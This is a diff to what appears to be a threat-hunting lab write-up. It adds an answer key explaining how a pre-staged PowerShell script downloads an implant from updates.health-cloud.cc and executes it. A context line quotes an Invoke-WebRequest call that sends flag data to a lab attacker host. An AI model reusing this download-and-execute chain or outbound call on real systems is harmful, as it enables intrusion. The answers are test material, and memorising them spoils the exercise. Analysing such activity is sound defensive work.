@@ -615,6 +615,12 @@ Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?flag=FLAG-10&d
 
 **Finding:** The pre-staged PS1 script (`task_FLAG-01.ps1`) makes an outbound HTTPS call to `updates.health-cloud.cc` — this is the download step. One second later it launches the retrieved binary — this is the execute step. The script already existed on disk; the connection was not to download the script but to fetch the implant binary itself.
 
+Answer:
+```
+Download then execute: a pre-staged PowerShell script makes an outbound HTTPS call to updates.health-cloud.cc to fetch PHtGHealthCloudSvc.exe (T1105 ingress tool transfer), then immediately launches the downloaded binary one second later — the PS1 script is the link between the two steps.
+
+```
+
 **Key Query:**
 ```kql
 DeviceProcessEvents
